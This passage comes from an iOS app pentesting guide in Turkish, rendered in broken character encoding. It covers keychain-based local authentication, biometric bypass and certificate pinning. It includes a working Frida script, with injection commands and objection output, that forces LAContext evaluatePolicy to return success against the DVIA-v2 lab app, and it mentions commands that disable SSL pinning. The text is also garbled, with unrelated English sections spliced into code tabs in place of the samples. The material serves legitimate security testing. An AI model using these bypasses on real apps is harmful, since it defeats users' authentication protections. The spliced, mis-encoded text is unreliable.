GeliÅŸtiriciler, yetkilendirme **kontrolleri**, veri **saklama** veya **gÃ¶nderme** iÅŸlemleri iÃ§in **kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸ algoritmalarÄ±** kullanmamalÄ±dÄ±r. Bu algoritmalarÄ±n bazÄ±larÄ± ÅŸunlardÄ±r: RC4, MD4, MD5, SHA1... Ã–rneÄŸin ÅŸifreleri saklamak iÃ§in **hash** kullanÄ±lÄ±yorsa, hashlerin tuz ile birlikte kullanÄ±lmasÄ± gerekmektedir.

### Kontrol

YapÄ±lmasÄ± gereken ana kontroller, kod iÃ§inde **sabitlenmiÅŸ** ÅŸifreler/sÄ±rlar bulunup bulunmadÄ±ÄŸÄ±nÄ±, bunlarÄ±n **tahmin edilebilir** olup olmadÄ±ÄŸÄ±nÄ± ve kodun bazÄ± tÃ¼r zayÄ±f **ÅŸifreleme** algoritmalarÄ±nÄ± kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± bulmaktÄ±r.

Ä°lginÃ§tir ki, **objection** kullanarak bazÄ± **ÅŸifreleme** **kÃ¼tÃ¼phanelerini** otomatik olarak izleyebilirsiniz:
```swift
ios monitor crypt
```
iOS ÅŸifreleme API'larÄ± ve kÃ¼tÃ¼phaneleri hakkÄ±nda **daha fazla bilgi** iÃ§in [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)'e eriÅŸin

## Yerel Kimlik DoÄŸrulama

**Yerel kimlik doÄŸrulama**, Ã¶zellikle uzaktaki bir uÃ§ noktaya ÅŸifreleme yÃ¶ntemleri aracÄ±lÄ±ÄŸÄ±yla eriÅŸimi koruma konusunda Ã¶nemli bir rol oynar. Buradaki esas nokta, uygun ÅŸekilde uygulanmadÄ±ÄŸÄ±nda yerel kimlik doÄŸrulama mekanizmalarÄ±nÄ±n atlatÄ±labileceÄŸidir.

Apple'Ä±n [**Yerel Kimlik DoÄŸrulama Ã§erÃ§evesi**](https://developer.apple.com/documentation/localauthentication) ve [**anahtarlÄ±k**](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) geliÅŸtiricilere kullanÄ±cÄ± kimlik doÄŸrulama iletiÅŸim kutularÄ±nÄ± kolaylaÅŸtÄ±rmak ve sÄ±rlÄ± verileri gÃ¼venli bir ÅŸekilde iÅŸlemek iÃ§in saÄŸlam API'lar saÄŸlar. GÃ¼venli Kasa, Parmak Ä°zi KimliÄŸi iÃ§in parmak izi kimliÄŸini gÃ¼vence altÄ±na alÄ±rken, YÃ¼z KimliÄŸi biyometrik verileri tehlikeye atmadan yÃ¼z tanÄ±ma Ã¼zerine kuruludur.

Touch ID/Face ID'yi entegre etmek iÃ§in geliÅŸtiricilerin iki API seÃ§eneÄŸi vardÄ±r:

* YÃ¼ksek seviyeli kullanÄ±cÄ± kimlik doÄŸrulamasÄ± iÃ§in **`LocalAuthentication.framework`**.
* DÃ¼ÅŸÃ¼k seviyeli anahtarlÄ±k hizmetlerine eriÅŸim iÃ§in **`Security.framework`**, biyometrik kimlik doÄŸrulamasÄ± ile gizli verileri gÃ¼ven altÄ±na alÄ±r. Ã‡eÅŸitli [aÃ§Ä±k kaynaklÄ± sargÄ±lar](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) anahtarlÄ±k eriÅŸimini daha basit hale getirir.

{% hint style="danger" %}
Ancak, hem `LocalAuthentication.framework` hem de `Security.framework`, Ã¶ncelikle kimlik doÄŸrulama sÃ¼reÃ§leri iÃ§in veri iletimi yapmadan genellikle boolean deÄŸerleri dÃ¶ndÃ¼rdÃ¼kleri iÃ§in atlanabilirliklere neden olabilirler (bkz. [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Yerel Kimlik DoÄŸrulamasÄ± Uygulamak

KullanÄ±cÄ±larÄ± kimlik doÄŸrulamasÄ± iÃ§in yÃ¶nlendirmek iÃ§in geliÅŸtiricilerin **`LAContext`** sÄ±nÄ±fÄ± iÃ§indeki **`evaluatePolicy`** yÃ¶ntemini kullanmalarÄ± gerekmektedir, ÅŸu seÃ§enekler arasÄ±ndan seÃ§im yaparak:

* **`deviceOwnerAuthentication`**: Touch ID veya cihaz ÅŸifresi iÃ§in yÃ¶nlendirme yapar, ikisi de etkin deÄŸilse baÅŸarÄ±sÄ±z olur.
* **`deviceOwnerAuthenticationWithBiometrics`**: YalnÄ±zca Touch ID iÃ§in yÃ¶nlendirme yapar.

BaÅŸarÄ±lÄ± bir kimlik doÄŸrulama, **`evaluatePolicy`** yÃ¶nteminden dÃ¶nen boolean bir deÄŸerle gÃ¶sterilir, bu da potansiyel bir gÃ¼venlik aÃ§Ä±ÄŸÄ±na iÅŸaret eder.

### AnahtarlÄ±k Kullanarak Yerel Kimlik DoÄŸrulamasÄ±

iOS uygulamalarÄ±nda **yerel kimlik doÄŸrulamasÄ±** uygulamak, kimlik doÄŸrulama belgeleri gibi gizli verileri gÃ¼venli bir ÅŸekilde saklamak iÃ§in **anahtarlÄ±k API'larÄ±**nÄ±n kullanÄ±mÄ±nÄ± iÃ§erir. Bu sÃ¼reÃ§, verinin yalnÄ±zca kullanÄ±cÄ± tarafÄ±ndan, cihaz ÅŸifresi veya Touch ID gibi biyometrik kimlik doÄŸrulama kullanÄ±larak eriÅŸilebileceÄŸini saÄŸlar.

AnahtarlÄ±k, `SecAccessControl` Ã¶zniteliÄŸi ile Ã¶ÄŸeleri ayarlamak iÃ§in yetenek sunar, bu da kullanÄ±cÄ±nÄ±n Touch ID veya cihaz ÅŸifresi ile baÅŸarÄ±lÄ± bir ÅŸekilde kimlik doÄŸrulamasÄ±nÄ± yapana kadar Ã¶ÄŸeye eriÅŸimi kÄ±sÄ±tlar. Bu Ã¶zellik gÃ¼venliÄŸi artÄ±rmak iÃ§in Ã¶nemlidir.

AÅŸaÄŸÄ±da, Swift ve Objective-C'de bir dizeyi anahtarlÄ±ÄŸa kaydetme ve geri almayÄ± gÃ¶steren kod Ã¶rnekleri bulunmaktadÄ±r, bu gÃ¼venlik Ã¶zelliklerini kullanarak eriÅŸim kontrolÃ¼nÃ¼ ayarlamayÄ± ve verinin yalnÄ±zca ayarlandÄ±ÄŸÄ± cihazda ve bir cihaz ÅŸifresinin yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ± koÅŸul altÄ±nda eriÅŸilebilir olmasÄ±nÄ± saÄŸlamayÄ± Ã¶zellikle gÃ¶stermektedir.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}

### iOS Application Pentesting

#### Setting up the Environment

To start iOS application pentesting, you need a macOS system with Xcode installed. Xcode is an integrated development environment (IDE) containing a suite of software development tools developed by Apple for developing software for macOS, iOS, watchOS, and tvOS.

#### Tools Required

1. **Xcode**: Required for building and running iOS applications.
2. **iOS Device or Simulator**: Required for testing the application.
3. **Burp Suite**: Used for intercepting and modifying network traffic.
4. **Cycript**: A developer's utility for in-depth examination and modification of running applications.
5. **Class-dump-z**: Used for generating headers from Mach-O files.
6. **Hopper Disassembler**: A reverse engineering tool used for disassembling, decompiling, and debugging applications.

#### Jailbroken vs. Non-Jailbroken Devices

When performing iOS application pentesting, it is important to understand the differences between testing on jailbroken and non-jailbroken devices. Jailbroken devices provide more access and control over the device, making it easier to analyze and manipulate applications. Non-jailbroken devices, on the other hand, provide a more secure testing environment closer to what end-users experience.

#### Common Vulnerabilities

Some common vulnerabilities to look for when pentesting iOS applications include:

- **Insecure Data Storage**
- **Insecure Communication**
- **Improper Session Handling**
- **Client-Side Injection**
- **Authentication Issues**
- **Sensitive Information Disclosure**

#### Conclusion

iOS application pentesting requires a good understanding of the tools and techniques used to identify vulnerabilities in iOS applications. By setting up the environment correctly and using the right tools, security professionals can effectively assess the security posture of iOS applications and help developers improve the overall security of their apps.

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

ArtÄ±k anahtarlÄ±kta kayÄ±tlÄ± Ã¶ÄŸeyi isteyebiliriz. AnahtarlÄ±k hizmetleri, kullanÄ±cÄ±ya kimlik doÄŸrulama iletiÅŸim kutusunu sunacak ve uygun bir parmak izi saÄŸlandÄ±ysa veri veya nil dÃ¶ndÃ¼recektir.
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}

### Objective-C

Objective-C is the primary programming language used for iOS app development. When performing iOS pentesting, it's essential to understand Objective-C code to identify security vulnerabilities and potential attack vectors.

#### Tools for Analyzing Objective-C Code

There are several tools available for analyzing Objective-C code during iOS pentesting:

1. **Hopper Disassembler**: A reverse engineering tool that can be used to disassemble, decompile, and debug applications.

2. **class-dump**: A command-line utility that generates a header file from a Mach-O file.

3. **otool**: A command-line tool for displaying specified parts of object files or libraries.

4. **Cycript**: A runtime manipulation tool that allows developers to explore and modify running applications.

By using these tools, pentesters can analyze Objective-C code to uncover potential security issues and weaknesses in iOS applications.

{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
### Tespit

Uygulamadaki Ã§erÃ§evelerin kullanÄ±mÄ±, uygulama ikili dosyasÄ±nÄ±n paylaÅŸÄ±lan dinamik kÃ¼tÃ¼phaneler listesini analiz ederek tespit edilebilir. Bunun iÃ§in `otool` kullanÄ±labilir:
```bash
$ otool -L <AppName>.app/<AppName>
```
EÄŸer bir uygulamada `LocalAuthentication.framework` kullanÄ±lÄ±yorsa, Ã§Ä±ktÄ± hem aÅŸaÄŸÄ±daki satÄ±rlarÄ± iÃ§erecektir (unutmayÄ±n ki `LocalAuthentication.framework` aslÄ±nda `Security.framework`'Ã¼ kullanmaktadÄ±r):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
EÄŸer `Security.framework` kullanÄ±lÄ±yorsa, sadece ikinci olan gÃ¶sterilecektir.

### Yerel Kimlik DoÄŸrulama Ã‡erÃ§evesi Atlatma

#### **Objection**

**Objection Biyometrik Atlatma** aracÄ±lÄ±ÄŸÄ±yla, [bu GitHub sayfasÄ±nda](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) bulunan bir teknik, **LocalAuthentication** mekanizmasÄ±nÄ± atlatmak iÃ§in mevcuttur. Bu yaklaÅŸÄ±mÄ±n Ã¶zÃ¼, `evaluatePolicy` fonksiyonunu manipÃ¼le etmek iÃ§in **Frida**'yÄ± kullanmaktÄ±r, bÃ¶ylece gerÃ§ek kimlik doÄŸrulama baÅŸarÄ±sÄ±ndan baÄŸÄ±msÄ±z olarak sÃ¼rekli olarak `True` sonucu vermesini saÄŸlar. Bu, hatalÄ± biyometrik kimlik doÄŸrulama sÃ¼reÃ§lerini atlamak iÃ§in Ã¶zellikle yararlÄ±dÄ±r.

Bu atlatmayÄ± etkinleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Bu komut, Objection'Ä±n bir gÃ¶rev kaydettiÄŸi bir sÄ±ra baÅŸlatÄ±r ve `evaluatePolicy` kontrolÃ¼nÃ¼n sonucunu etkili bir ÅŸekilde `True` olarak deÄŸiÅŸtirir.

#### Frida

**`evaluatePolicy`**'nin bir kullanÄ±m Ã¶rneÄŸi [DVIA-v2 uygulamasÄ±ndan](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
**Yerel Kimlik DoÄŸrulamasÄ±**nÄ±n **atlatÄ±lmasÄ±** iÃ§in bir Frida betiÄŸi yazÄ±lÄ±r. Bu betik, **evaluatePolicy** kontrolÃ¼nÃ¼ hedef alarak, geri aramasÄ±nÄ± onaylamak iÃ§in onu engeller ve **success=1** dÃ¶ndÃ¼ÄŸÃ¼nden emin olur. Geri aramanÄ±n davranÄ±ÅŸÄ±nÄ± deÄŸiÅŸtirerek, kimlik doÄŸrulama kontrolÃ¼ etkili bir ÅŸekilde atlatÄ±lÄ±r.

AÅŸaÄŸÄ±daki betik, **evaluatePolicy** yÃ¶nteminin sonucunu deÄŸiÅŸtirmek iÃ§in enjekte edilir. Geri aramanÄ±n sonucunu her zaman baÅŸarÄ± olarak gÃ¶sterir.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```
Frida betiÄŸi enjekte etmek ve biyometrik kimlik doÄŸrulamayÄ± atlamak iÃ§in aÅŸaÄŸÄ±daki komut kullanÄ±lÄ±r:
```bash
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## IPC AracÄ±lÄ±ÄŸÄ±yla Hassas FonksiyonelliÄŸin AÃ§Ä±ÄŸa Ã‡Ä±karÄ±lmasÄ±

### Ã–zel URI Ä°ÅŸleyicileri / Derin BaÄŸlantÄ±lar / Ã–zel Åemalar

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Evrensel BaÄŸlantÄ±lar

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### UIActivity PaylaÅŸÄ±mÄ±

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Uygulama UzantÄ±larÄ±

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### Web GÃ¶rÃ¼nÃ¼mleri

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### SerileÅŸtirme ve Kodlama

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## AÄŸ Ä°letiÅŸimi

**Åifreleme olmadan** gerÃ§ekleÅŸen iletiÅŸimi kontrol etmek Ã¶nemlidir ve aynÄ± zamanda uygulamanÄ±n sunucunun TLS sertifikasÄ±nÄ± doÄŸru bir ÅŸekilde **doÄŸruladÄ±ÄŸÄ±ndan** emin olmak da Ã¶nemlidir.\
Bu tÃ¼r sorunlarÄ± kontrol etmek iÃ§in **Burp** gibi bir proxy kullanabilirsiniz:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Ana Bilgisayar AdÄ± KontrolÃ¼

TLS sertifikasÄ±nÄ± doÄŸrularken karÅŸÄ±laÅŸÄ±lan yaygÄ±n bir sorun, sertifikanÄ±n bir **gÃ¼venilir CA** tarafÄ±ndan imzalandÄ±ÄŸÄ±nÄ± kontrol etmek, ancak sertifikanÄ±n **eriÅŸilen ana bilgisayar adÄ±** olup olmadÄ±ÄŸÄ±nÄ± kontrol etmemektir.\
Bu sorunu Burp kullanarak kontrol etmek iÃ§in, iPhone'da Burp CA'ya gÃ¼ven verdikten sonra, Burp ile farklÄ± bir ana bilgisayar adÄ± iÃ§in yeni bir sertifika **oluÅŸturabilir ve kullanabilirsiniz**. Uygulama hala Ã§alÄ±ÅŸÄ±yorsa, bir zafiyet bulunmaktadÄ±r.

### Sertifika Pinleme

Bir uygulama SSL Pinning'i doÄŸru bir ÅŸekilde kullanÄ±yorsa, uygulama yalnÄ±zca beklenen sertifika varsa Ã§alÄ±ÅŸacaktÄ±r. Bir uygulamayÄ± test ederken **bu bir sorun olabilir Ã§Ã¼nkÃ¼ Burp kendi sertifikasÄ±nÄ± sunacaktÄ±r.**\
Bu korumayÄ± bir jailbroken cihazda atlamak iÃ§in uygulamayÄ± [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) veya [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device) yÃ¼kleyebilirsiniz.

AyrÄ±ca **objection'Ä±n** `ios sslpinning disable` komutunu da kullanabilirsiniz.

## Ã‡eÅŸitli

* **`/System/Library`** dizininde, sistem uygulamalarÄ± tarafÄ±ndan kullanÄ±lan telefon Ã¼zerinde yÃ¼klÃ¼ Ã§erÃ§eveleri bulabilirsiniz.
* KullanÄ±cÄ± tarafÄ±ndan App Store'dan yÃ¼klenen uygulamalar **`/User/Applications`** iÃ§inde bulunur.
* Ve **`/User/Library`** kullanÄ±cÄ± dÃ¼zeyindeki uygulamalar tarafÄ±ndan kaydedilen verileri iÃ§erir.
* Uygulama iÃ§inde kaydedilen notlarÄ± okumak iÃ§in **`/User/Library/Notes/notes.sqlite`** dosyasÄ±na eriÅŸebilirsiniz.
* YÃ¼klenmiÅŸ bir uygulamanÄ±n klasÃ¶rÃ¼ iÃ§inde (**`/User/Applications/<UYGULAMA ID'si>/`**) bazÄ± ilginÃ§ dosyalar bulabilirsiniz:
  * **`iTunesArtwork`**: Uygulama tarafÄ±ndan kullanÄ±lan simge
  * **`iTunesMetadata.plist`**: App Store'da kullanÄ±lan uygulama bilgileri
  * **`/Library/*`**: Tercihleri ve Ã¶nbelleÄŸi iÃ§erir. **`/Library/Cache/Snapshots/*`** iÃ§inde, uygulamanÄ±n arka plana gÃ¶nderilmeden Ã¶nce yapÄ±lan anlÄ±k gÃ¶rÃ¼ntÃ¼leri bulabilirsiniz.

### SÄ±cak Yama/Zorunlu GÃ¼ncelleme

GeliÅŸtiriciler, uygulamalarÄ±nÄ±n tÃ¼m yÃ¼klemelerine anÄ±nda **yama uygulayabilirler** ve uygulamayÄ± App Store'a yeniden gÃ¶nderip onaylanmasÄ±nÄ± beklemek zorunda kalmazlar.\
Bu amaÃ§la genellikle [**JSPatch**](https://github.com/bang590/JSPatch) gibi araÃ§lar kullanÄ±lÄ±r. Ancak [Siren](https://github.com/ArtSabintsev/Siren) ve [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker) gibi diÄŸer seÃ§enekler de vardÄ±r.\
**Bu, kÃ¶tÃ¼ niyetli Ã¼Ã§Ã¼ncÃ¼ taraf SDK'larÄ± tarafÄ±ndan kÃ¶tÃ¼ye kullanÄ±labilecek tehlikeli bir mekanizmadÄ±r, bu nedenle otomatik gÃ¼ncelleme iÃ§in hangi yÃ¶ntemin kullanÄ±ldÄ±ÄŸÄ±nÄ± kontrol etmeniz ve test etmeniz Ã¶nerilir.** Bu amaÃ§la uygulamanÄ±n Ã¶nceki bir sÃ¼rÃ¼mÃ¼nÃ¼ indirmeyi deneyebilirsiniz.

### ÃœÃ§Ã¼ncÃ¼ Taraflar

**3. taraf SDK'larÄ±** ile Ã¶nemli bir zorluk, iÅŸlevselliklerinin Ã¼zerinde **ayrÄ±ntÄ±lÄ± kontrol eksikliÄŸidir**. GeliÅŸtiriciler, ya SDK'yÄ± entegre eder ve potansiyel gÃ¼venlik aÃ§Ä±klarÄ± ve gizlilik endiÅŸeleri de dahil olmak Ã¼zere tÃ¼m Ã¶zelliklerini kabul eder ya da tamamen faydalarÄ±ndan vazgeÃ§er. Genellikle, geliÅŸtiriciler bu SDK'larÄ±n iÃ§indeki gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kendileri yamayamazlar. AyrÄ±ca, SDK'lar topluluk iÃ§inde gÃ¼ven kazandÄ±kÃ§a, bazÄ±larÄ± kÃ¶tÃ¼ amaÃ§lÄ± yazÄ±lÄ±mlar iÃ§erebilir.

ÃœÃ§Ã¼ncÃ¼ taraf SDK'larÄ±n saÄŸladÄ±ÄŸÄ± hizmetler arasÄ±nda kullanÄ±cÄ± davranÄ±ÅŸlarÄ±nÄ± izleme, reklam gÃ¶sterimi veya kullanÄ±cÄ± deneyimi iyileÅŸtirmeleri bulunabilir. Ancak, bu, geliÅŸtiricilerin bu kÃ¼tÃ¼phaneler tarafÄ±ndan yÃ¼rÃ¼tÃ¼len kodun tam olarak farkÄ±nda olmamalarÄ±na ve potansiyel gizlilik ve gÃ¼venlik risklerine yol aÃ§abilir. ÃœÃ§Ã¼ncÃ¼ taraf hizmetlerle paylaÅŸÄ±lan bilgilerin sÄ±nÄ±rlÄ± olmasÄ± ve hassas verilerin aÃ§Ä±ÄŸa Ã§Ä±karÄ±lmamasÄ±nÄ±n saÄŸlanmasÄ± Ã¶nemlidir.

ÃœÃ§Ã¼ncÃ¼ taraf hizmetlerin uygulanmasÄ± genellikle iki ÅŸekilde gerÃ§ekleÅŸir: baÄŸÄ±msÄ±z bir kÃ¼tÃ¼phane veya tam bir SDK. Bu hizmetlerle paylaÅŸÄ±lan verilerin **anonimleÅŸtirilmesi**, KiÅŸisel TanÄ±mlanabilir Bilgilerin (PII) ifÅŸasÄ±nÄ± Ã¶nlemek iÃ§in gereklidir.

Bir uygulamanÄ±n kullandÄ±ÄŸÄ± kÃ¼tÃ¼phaneleri belirlemek iÃ§in **`otool`** komutu kullanÄ±labilir. Bu araÃ§, uygulama ve kullandÄ±ÄŸÄ± her paylaÅŸÄ±lan kÃ¼tÃ¼phane Ã¼zerinde Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r, ek kÃ¼tÃ¼phaneleri keÅŸfetmek iÃ§in.
```bash
otool -L <application_path>
```
## **Referanslar ve Daha Fazla Kaynak**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS ve Mobil Uygulama Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) IOS Ã¼cretsiz kursu([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
